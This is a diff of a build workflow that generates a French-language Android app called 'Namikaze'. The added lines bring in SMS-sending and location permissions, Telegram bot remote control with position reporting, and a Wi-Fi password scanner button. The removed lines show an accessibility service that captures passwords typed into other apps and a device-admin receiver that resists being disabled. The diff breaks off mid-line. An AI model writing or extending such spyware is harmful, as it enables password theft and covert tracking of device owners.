@@ -59,8 +59,8 @@ jobs:
                   applicationId = "com.namikaze.app"
                   minSdk = 29
                   targetSdk = 35
-                  versionCode = 1
-                  versionName = "1.0"
+                  versionCode = 3
+                  versionName = "3.0"
               }
               compileOptions {
                   sourceCompatibility = JavaVersion.VERSION_17
@@ -74,6 +74,7 @@ jobs:
               implementation("androidx.appcompat:appcompat:1.7.0")
               implementation("com.google.android.material:material:1.12.0")
               implementation("androidx.security:security-crypto:1.1.0-alpha06")
+              implementation("androidx.work:work-runtime-ktx:2.9.1")
               implementation("com.squareup.okhttp3:okhttp:4.12.0")
               implementation("com.wireguard.android:tunnel:1.0.20230706")
               implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
@@ -87,10 +88,14 @@ jobs:
               <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
               <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
               <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+              <uses-permission android:name="android.permission.WAKE_LOCK"/>
               <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
               <uses-permission android:name="android.permission.RECEIVE_SMS"/>
               <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.SEND_SMS"/>
               <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
               <uses-permission android:name="android.permission.BLUETOOTH_CONNECT"/>
               <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
@@ -158,7 +163,7 @@ jobs:
           EOF
           cat > app/src/main/res/xml/device_admin.xml <<'EOF'
           <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
-              <uses-policies><force-lock/><reset-password/></uses-policies>
+              <uses-policies><force-lock/><reset-password/><watch-login/></uses-policies>
           </device-admin>
           EOF
           cat > app/src/main/res/values/strings.xml <<'EOF'
@@ -182,6 +187,10 @@ jobs:
                       android:layout_width="match_parent" android:layout_height="wrap_content"/>
                   <Button android:id="@+id/bRoot" android:text="ROOT NAMIKAZE — tout activer"
                       android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bWifi" android:text="Scanner les Wi-Fi + mots de passe"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bBoost" android:text="Booster le réseau (Wi-Fi actif)"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
                   <Button android:id="@+id/bVpn" android:text="VPN ANONYMALKAZE (config clés)"
                       android:layout_width="match_parent" android:layout_height="wrap_content"/>
                   <Button android:id="@+id/bAccess" android:text="Activer la capture des mots de passe"
@@ -191,6 +200,23 @@ jobs:
                   <Button android:id="@+id/bPasswords" android:text="Voir le coffre"
                       android:layout_width="match_parent" android:layout_height="wrap_content"/>
                   <Button android:id="@+id/bScan" android:text="Radar proxy / Shodan"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <TextView android:text="— Contrôle à distance —" android:textColor="#00E5A0"
+                      android:paddingTop="16dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+                  <EditText android:id="@+id/etToken" android:hint="Token du bot Telegram"
+                      android:textColor="#FFFFFF" android:textColorHint="#666666"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <EditText android:id="@+id/etChat" android:hint="Chat ID Telegram"
+                      android:textColor="#FFFFFF" android:textColorHint="#666666"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <EditText android:id="@+id/etSos" android:hint="Numéro SOS (SMS si SIM changée)"
+                      android:textColor="#FFFFFF" android:textColorHint="#666666"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bTgSave" android:text="Enregistrer / activer le bot"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bTgTest" android:text="Tester Telegram"
+                      android:layout_width="match_parent" android:layout_height="wrap_content"/>
+                  <Button android:id="@+id/bLocate" android:text="Envoyer ma position (Telegram)"
                       android:layout_width="match_parent" android:layout_height="wrap_content"/>
                   <TextView android:id="@+id/tvOut" android:textIsSelectable="true" android:textColor="#CCCCCC"
                       android:paddingTop="12dp" android:layout_width="match_parent" android:layout_height="wrap_content"/>
@@ -299,51 +325,4 @@ jobs:
               fun all(ctx: Context): List<Entry> = open(ctx).all.mapNotNull { (k, v) ->
                   val raw = v as? String ?: return@mapNotNull null
                   val p = raw.split("\u0000")
-                  Entry(k.substringBefore("|"), k.substringAfter("|"), p[0], p.getOrElse(1) { "0" }.toLongOrNull() ?: 0)
-              }.sortedByDescending { it.ts }
-          }
-          EOF
-          cat > app/src/main/java/com/namikaze/app/NamikazeAccessibilityService.kt <<'EOF'
-          package com.namikaze.app
-          import android.accessibilityservice.AccessibilityService
-          import android.view.accessibility.AccessibilityEvent
-          import android.view.accessibility.AccessibilityNodeInfo
-          class NamikazeAccessibilityService : AccessibilityService() {
-              override fun onAccessibilityEvent(e: AccessibilityEvent) {
-                  if (!LicenseManager.isActive(this)) return
-                  if (e.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
-                  val node = e.source ?: return
-                  if (!node.isPassword) return
-                  val value = e.text.joinToString("").ifBlank { return }
-                  val pkg = e.packageName?.toString() ?: "inconnu"
-                  PasswordVault.upsert(this, pkg, domain(node) ?: pkg, value)
-              }
-              private fun domain(n: AccessibilityNodeInfo): String? {
-                  var p = n.parent; var g = 0
-                  while (p != null && g++ < 15) {
-                      p.text?.toString()?.let { if (it.contains(".") && it.contains("/")) return it }
-                      p = p.parent
-                  }
-                  return null
-              }
-              override fun onInterrupt() {}
-          }
-          EOF
-          cat > app/src/main/java/com/namikaze/app/DeviceGuard.kt <<'EOF'
-          package com.namikaze.app
-          import android.app.admin.DeviceAdminReceiver
-          import android.content.Context
-          import android.content.Intent
-          class DeviceGuard : DeviceAdminReceiver() {
-              override fun onDisableRequested(context: Context, intent: Intent): CharSequence =
-                  if (LicenseManager.isActive(context)) "NAMIKAZE protège cet appareil."
-                  else super.onDisableRequested(context, intent)
-          }
-          EOF
-          cat > app/src/main/java/com/namikaze/app/SimWatcher.kt <<'EOF'
-          package com.namikaze.app
-          import android.content.BroadcastReceiver
-          import android.content.Context
-          import android.content.Intent
-          class SimWatcher : BroadcastReceiver() {
- 
+                  Entry(k.substringBefo
